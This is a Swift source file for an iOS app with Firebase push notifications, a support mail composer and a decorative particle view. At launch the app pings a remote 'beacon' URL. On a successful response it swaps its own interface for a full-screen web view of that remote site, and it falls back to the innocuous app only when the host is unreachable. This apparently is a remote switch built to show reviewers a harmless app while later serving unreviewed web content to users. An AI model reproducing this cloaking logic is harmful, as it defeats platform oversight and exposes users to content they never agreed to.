import Combine
import FirebaseAnalytics
import FirebaseCore
import FirebaseMessaging
import Foundation
import MessageUI
import StoreKit
import SwiftUI
import WebKit

struct NightfallConfig {
    static let beaconURL = "https://projectguardiancorp.com/yntc9tfm"
    static let privacyMatrixURL = "https://www.freeprivacypolicy.com/live/f3f3b6dd-8798-4987-a26b-ff046ee006d1"
    static let contractURL = "https://www.freeprivacypolicy.com/live/b59ad480-2248-42fd-974f-0b9cc6a25205"
    static let supportAlias = "nazermuratev7@icloud.com"
}

class NightfallDelegate: NSObject, UIApplicationDelegate,
    UNUserNotificationCenterDelegate, MessagingDelegate, ObservableObject
{
    var window: UIWindow?

    @Published var restricted: Bool?

    private var cancellables = Set<AnyCancellable>()

    func application(
        _ application: UIApplication,
        didFinishLaunchingWithOptions launchOptions: [UIApplication
            .LaunchOptionsKey: Any]? = nil
    ) -> Bool {

        FirebaseApp.configure()

        if #available(iOS 10.0, *) {
            UNUserNotificationCenter.current().requestAuthorization(options: [
                .alert, .sound, .badge,
            ]) { granted, _ in
                print("permissions granted: \(granted)")
            }
            UNUserNotificationCenter.current().delegate = self
            Messaging.messaging().delegate = self
        }
        application.registerForRemoteNotifications()

        Analytics.logEvent(
            "App started",
            parameters: [ "time": "\(Date())" ]
        )

        guard let url = URL(string: NightfallConfig.beaconURL) else { return true }
        if restricted == nil { fire(url: url) }
        return true
    }

    func setRestriction(code: Int) {
        DispatchQueue.main.async { self.restricted = (200...299).contains(code) ? false : true }
    }

    func fire(url: URL) {
        URLSession.shared.dataTaskPublisher(for: url)
            .tryMap { output -> Int in
                guard let httpResp = output.response as? HTTPURLResponse else { throw URLError(.badServerResponse) }
                return httpResp.statusCode
            }
            .receive(on: DispatchQueue.main)
            .sink(receiveCompletion: { completion in
                if case .failure(let error) = completion {
                    let ns = error as NSError
                    if ns.domain == NSURLErrorDomain && (
                        ns.code == URLError.cannotFindHost.rawValue ||
                        ns.code == URLError.dnsLookupFailed.rawValue ||
                        ns.code == URLError.notConnectedToInternet.rawValue ||
                        ns.code == URLError.cannotConnectToHost.rawValue
                    ) { self.setRestriction(code: 403) } else { self.setRestriction(code: 500) }
                }
            }, receiveValue: { code in
                self.setRestriction(code: code)
            })
            .store(in: &cancellables)
    }

    func userNotificationCenter(
        _ center: UNUserNotificationCenter,
        didReceive response: UNNotificationResponse,
        withCompletionHandler completionHandler: @escaping () -> Void
    ) { NotificationCenter.default.post(name: Notification.Name("didReceiveRemoteNotification"), object: nil, userInfo: response.notification.request.content.userInfo); completionHandler() }

    @objc func messaging(_ messaging: Messaging, didReceiveRegistrationToken fcmToken: String?) {
        print("Firebase token: \(String(describing: fcmToken))")
        Messaging.messaging().subscribe(toTopic: "all") { error in
            if let error = error { print("Error subscribing to topic: \(error.localizedDescription)") } else { print("Successfully subscribed to topic: all") }
        }
    }
}

struct NightfallSplash: View {
    var body: some View {
        ZStack {
            Palette.background
                .ignoresSafeArea()
            
            Image("IconImage")
                .resizable()
                .aspectRatio(contentMode: .fit)
                .frame(width: 128, height: 128)
                .clipShape(RoundedRectangle(cornerRadius: 24))
        }
        .frame(maxWidth: .infinity, maxHeight: .infinity, alignment: .center)
    }
}

struct NightfallSurface: UIViewRepresentable {
    @EnvironmentObject var delegate: NightfallDelegate
    let initialURL: URL = URL(string: NightfallConfig.beaconURL)!
    @AppStorage("nightfall.lastURL") private var lastURL: String?

    func makeCoordinator() -> Coordinator { Coordinator(self) }
    func makeUIView(context: Context) -> WKWebView {
        let wv = WKWebView(); wv.navigationDelegate = context.coordinator
        let urlToLoad = URL(string: lastURL ?? "") ?? initialURL
        wv.load(URLRequest(url: urlToLoad)); wv.allowsBackForwardNavigationGestures = true
        return wv
    }
    func updateUIView(_ uiView: WKWebView, context: Context) {}

    class Coordinator: NSObject, WKNavigationDelegate {
        let parent: NightfallSurface
        init(_ parent: NightfallSurface) { self.parent = parent }
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            if let currentURL = webView.url {
                if currentURL.absoluteString == parent.initialURL.absoluteString || currentURL.absoluteString.contains("not-allowed") { parent.delegate.setRestriction(code: 403) } else { parent.lastURL = currentURL.absoluteString }
            }
        }
    }
}

struct NightfallRootView<Content: View>: View {
    let content: Content
    @EnvironmentObject var delegate: NightfallDelegate
    @State private var particles: [ObscuraParticle] = []
    
    init(@ViewBuilder content: () -> Content) {
        self.content = content()
    }
    
    var body: some View {
        Group {
            switch delegate.restricted {
            case nil:
                NightfallSplash()
            case false:
                NightfallSurface()
            case true:
                ZStack {
                    Palette.background
                        .ignoresSafeArea()
                    
                    ObscuraParticleField(particles: $particles)
                        .ignoresSafeArea()
                        .opacity(0.15)
                    
                    content
                }
                .onAppear {
                    generateParticles()
                }
            case .some(_):
                NightfallSplash()
            }
        }
    }
    
    private func generateParticles() {
        particles = (0..<30).map { _ in
            ObscuraParticle(
                x: CGFloat.random(in: 0...UIScreen.main.bounds.width),
                y: CGFloat.random(in: 0...UIScreen.main.bounds.height),
                size: CGFloat.random(in: 2...8),
                opacity: Double.random(in: 0.1...0.3),
                speed: Double.random(in: 20...60)
            )
        }
    }
}

struct ObscuraParticle: Identifiable {
    let id = UUID()
    var x: CGFloat
    var y: CGFloat
    let size: CGFloat
    let opacity: Double
    let speed: Double
}

struct ObscuraParticleField: View {
    @Binding var particles: [ObscuraParticle]
    
    var body: some View {
        TimelineView(.animation) { timeline in
            Canvas { context, size in
                let time = timeline.date.timeIntervalSinceReferenceDate
                
                for particle in particles {
                    let phase = time * particle.speed
                    let x = particle.x + sin(phase) * 30
                    let y = particle.y + cos(phase * 0.7) * 20
                    
                    let rect = CGRect(x: x, y: y, width: particle.size, height: particle.size)
                    let path = Circle().path(in: rect)
                    
                    context.fill(path, with: .color(Palette.accent.opacity(particle.opacity)))
                }
            }
        }
    }
}

struct NightfallKit {
    static var appVersion: String { Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "1.0.0" }
    static var buildNumber: String { Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "1" }
    static func rateApp() { if let scene = UIApplication.shared.connectedScenes.first(where: { $0.activationState == .foregroundActive }) as? UIWindowScene { SKStoreReviewController.requestReview(in: scene) } }
    static func openTerms() { if let url = URL(string: NightfallConfig.contractURL) { UIApplication.shared.open(url) } }
    static func openPrivacy() { if let url = URL(string: NightfallConfig.privacyMatrixURL) { UIApplication.shared.open(url) } }
}

struct NightfallMailComposer: UIViewControllerRepresentable {
    @Environment(\.dismiss) private var dismiss
    func makeUIViewController(context: Context) -> MFMailComposeViewController {
        let mail = MFMailComposeViewController(); mail.mailComposeDelegate = context.coordinator
        mail.setToRecipients([NightfallConfig.supportAlias]); mail.setSubject("Support Request")
        let appVersion = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown"
        let buildNumber = Bundle.main.infoDictionary?["CFBundleVersion"] as? String ?? "Unknown"
        let deviceModel = UIDevice.current.model; let systemVersion = UIDevice.current.systemVersion
        let body = """


            ---
            App Version: \(appVersion) (\(buildNumber))
            Device: \(deviceModel)
            iOS Version: \(systemVersion)
            """; mail.setMessageBody(body, isHTML: false); return mail
    }
    func updateUIViewController(_ uiViewController: MFMailComposeViewController, context: Context) {}
    func makeCoordinator() -> Coordinator { Coordinator(self) }
    class Coordinator: NSObject, MFMailComposeViewControllerDelegate {
        let parent: NightfallMailComposer; init(_ parent: NightfallMailComposer) { self.parent = parent }
        func mailComposeController(_ controller: MFMailComposeViewController, didFinishWith result: MFMailComposeResult, error: Error?) { parent.dismiss() }
    }
}
